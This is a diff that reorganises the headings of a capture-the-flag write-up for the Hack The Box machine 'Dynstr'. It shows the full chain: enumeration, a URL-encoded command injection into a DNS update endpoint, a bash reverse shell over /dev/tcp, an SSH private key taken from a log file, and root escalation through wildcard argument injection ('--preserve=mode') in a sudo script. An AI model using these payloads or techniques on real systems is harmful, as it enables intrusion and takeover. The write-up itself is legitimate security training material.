@@ -2,8 +2,9 @@
 IP address : 10.10.10.244\
 OS : Linux
 
-## Enumeration
-Firstly, let us enumerate all the open ports using ```Nmap```
+## Discovery
+### Nmap
+Firstly, let us enumerate all the open ports using Nmap
 * sV : service detection
 * sC : Run default nmap scripts
 * A : identify the OS behind each ports
@@ -25,7 +26,7 @@ Now, we will do a scan on the UDP ports to find any possible open UDP ports. Hoo
 nmap -sU -Pn 10.10.10.244 -T4 -vv 
 ```
 
-## Discovery
+### Web discovery
 Looking through the webpages, we are able to discover several domains and credentials related this challenge.
 
 ![Dynstr domains](https://github.com/joelczk/writeups/blob/main/HTB/Images/dyntsr/dynstr_domains.PNG)
@@ -37,7 +38,7 @@ Now, we will add these domains into the ```etc/hosts``` file
 ```
 10.10.10.244    dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb dns@dyna.htb
 ```
-
+### Gobuster
 We will now run ```gobuster``` on ```http://dyna.htb``` to enumerate the directories on the endpoints
 ```
 ┌──(kali㉿kali)-[~]
@@ -90,6 +91,9 @@ http://dyna.htb/nic/update               (Status: 200) [Size: 8]
 ===============================================================
 2021/08/20 21:21:04 Finished
 ```
+
+## Exploit
+### noip Authentication
 We will now visit the ```/nic/update``` endpoints, and we notice that we are returned with a ```badauth```. After some research, we found from [here](https://www.noip.com/integrate/request)
 that this endpoints takes in a request of the following format:
 ```
@@ -131,7 +135,7 @@ Content-Type: text/html; charset=UTF-8
 
 good <Redacted IP address>
 ```
-
+### Command injection
 We also realized that changing the hostname to ```;'dynamicdns.no-ip.htb``` will return an error code ```911 [nsupdate failed]```. This is an indication that this endpoint is vulnerable to command injection. We will first create a POC to execute ```id``` and ```whoami``` command. We will modify the payload by first encoding the payload ```" | id&&whoami```. The URL encoded payload for hostname will be ```%22%20%7c%20id%26%26whoami;dynamicdns.no-ip.htb```. In the response, we are able to receive the output to the 2 commands, which showed that the POC is successful.
 ```
 HTTP/1.1 200 OK
@@ -147,7 +151,7 @@ www-data
 good <Redacted IP address>
 ```
 
-## Obtaining User flag
+### Obtaining a reverse shell
 Firstly, we have to obtain a Base64 encoding of the following payload:
 ```
 bash -i >& /dev/tcp/<IP address of your local machine>/3000 0>&1
@@ -172,6 +176,8 @@ export TERM=xterm
 www-data@dynstr:/var/www/html/nic$ stty cols 132 rows 34
 stty cols 132 rows 34
 ```
+
+### Obtaining user flag
 We were able to find the user flag in ```/home/bindmgr``` directory. However, we realize that we do not have the correct privileges to view the file.
 ```
 www-data@dynstr:/var/www/html/nic$ cd /home/bindmgr
@@ -181,7 +187,7 @@ cat user.txt
 cat: user.txt: Permission denied
 www-data@dynstr:/home/bindmgr$ 
 ```
-
+### Obtaining SSH private key
 Viewing the ```strace-C62796521.txt``` in the same directory, we were able to find an OPENSSH key that we will save to our local directory and try to SSH into the server.
 ```
 15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096) = 1823
@@ -193,7 +199,7 @@ After cleaning up the key file, we will save it to a ```ssh_key``` file and try 
 └─$ ssh -i ssh_key bindmgr@10.10.10.244                                                         6 ⚙
 bindmgr@10.10.10.244's password: 
 ```
-
+### Modifying DNS records
 Let's go back to check if we can find anything else that we are missing. True enough, in the ```/var/www/html/nic``` directory, we found a ```update``` file. Viewing the source code in the ```update``` file, we know that ```/usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key``` is being executed. The main reason why we could not SSH into the server was because our IP address is not in the zone.
 ```
   if(isset($_GET['hostname'])) {
@@ -301,7 +307,7 @@ bindmgr@dynstr:~$ cat user.txt
 bindmgr@dynstr:~$ 
 ```
 
-## Obtaining system flag
+### Code Analysis of bindmgr.sh
 First, we will run ```sudo -l``` to check the permissions of the binaries and we realize that ```/usr/local/bin/bindmgr.sh``` can be executed with root privileges without any password.
 ```
 bindmgr@dynstr:~$ sudo -l
@@ -315,7 +321,6 @@ User bindmgr may run the following commands on dynstr:
 bindmgr@dynstr:~$ 
 ```
 
-### Code Analysis of bindmgr.sh
 The first part of the code shows that the current directory would require a ```.version``` file with a version number as the command ```cat .version``` is being executed.
 ```
 # Check versioning (.version)
@@ -347,7 +352,7 @@ echo "[+] Staging files to $BINDMGR_DIR."
 cp .version * /etc/bind/named.bindmgr/
 ```
 
-### Exploit
+### Exploiting blindmgr.sh
 First, we will have to create a version file with a version number
 ```
 echo "2" > .version
@@ -377,7 +382,7 @@ bindmgr@dynstr:~$ echo > --preserve=mode
 bindmgr@dynstr:~$ ls
  bash  '--preserve=mode'  support-case-C62796521   user.txt
 ```
-Next, we will have to execute the script so that the bash biinary with root privileges will be copied to ```/etc/bind/named.bindmgr```
+Next, we will have to execute the script so that the bash binary with root privileges will be copied to ```/etc/bind/named.bindmgr```
 ```
 bindmgr@dynstr:~$ sudo /usr/local/bin/bindmgr.sh
 sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
@@ -392,6 +397,8 @@ cp: -r not specified; omitting directory 'support-case-C62796521'
     /etc/bind/named.bindmgr/bash:40: unknown option '�YF'
     /etc/bind/named.bindmgr/bash:40: unexpected token near '}'
 ```
+
+### Ontaining root flag
 Lastly, we will just have to navigate to ```/etc/bind/named.bindmgr``` so that the bash can be executed with root privileges and obtain the system flag.
 ```
 bindmgr@dynstr:~$ cd /etc/bind/named.bindmgr
